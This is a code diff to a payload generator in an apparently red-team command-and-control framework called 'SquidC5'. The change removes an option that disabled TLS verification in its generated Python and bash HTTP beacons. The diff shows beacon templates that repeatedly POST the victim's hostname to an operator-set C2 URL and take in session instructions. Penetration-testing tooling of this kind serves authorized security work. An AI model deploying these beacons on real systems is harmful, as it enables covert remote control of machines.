@@ -118,21 +118,15 @@ class PayloadGenerator:
         scheme = (extra.get("scheme") or "https").lower()
         if scheme not in ("http", "https"):
             scheme = "https"
-        # insecure TLS verify only when operator explicitly sets insecure=true (lab self-signed)
-        insecure = bool(extra.get("insecure", False))
         return f'''#!/usr/bin/env python3
 # SquidC5 HTTP beacon — authorized testing only (profile-aware)
+# HTTPS verifies system CAs. For lab self-signed, terminate TLS on a redirector
+# or use scheme=http on an isolated lab network.
 import json, random, time, urllib.request, ssl
 BASE = "{scheme}://{host}:{port}"
 PATH = {json.dumps(path)}
 C2 = BASE + PATH
-if BASE.startswith("https"):
-    SSL_CTX = ssl.create_default_context()
-    if {insecure}:
-        SSL_CTX.check_hostname = False
-        SSL_CTX.verify_mode = ssl.CERT_NONE
-else:
-    SSL_CTX = None
+SSL_CTX = ssl.create_default_context() if BASE.startswith("https") else None
 UA = {ua}
 EXTRA_HEADERS = {hdrs_json}
 BODY_TPL = {body_tpl_json}
@@ -220,17 +214,16 @@ while True:
         scheme = (extra.get("scheme") or "https").lower()
         if scheme not in ("http", "https"):
             scheme = "https"
-        # -k only when operator explicitly opts into lab self-signed
-        curl_k = "-k " if bool(extra.get("insecure", False)) else ""
         return f'''#!/bin/bash
 # SquidC5 HTTP beacon — authorized testing only (profile-aware path/UA)
+# HTTPS verifies system CAs (no curl -k). Use redirector or scheme=http in lab.
 C2="{scheme}://{host}:{port}{path}"
 UA="{ua}"
 SLEEP_BASE={sleep_base}
 JITTER={jitter}
 SID=""
 while true; do
-  RESP=$(curl -s {curl_k}-X POST "$C2" -A "$UA" -H "Content-Type: application/json" -d "{{\\"session_id\\":\\"$SID\\",\\"hostname\\":\\"$(hostname)\\"}}" || true)
+  RESP=$(curl -s -X POST "$C2" -A "$UA" -H "Content-Type: application/json" -d "{{\\"session_id\\":\\"$SID\\",\\"hostname\\":\\"$(hostname)\\"}}" || true)
   # strip optional non-json prefix/suffix by extracting first {{...}}
   RESP=$(echo "$RESP" | sed -n 's/.*\\({{.*}}\\).*/\\1/p')
   SID=$(echo "$RESP" | sed -n 's/.*"session_id":"\\([^"]*\\)".*/\\1/p')
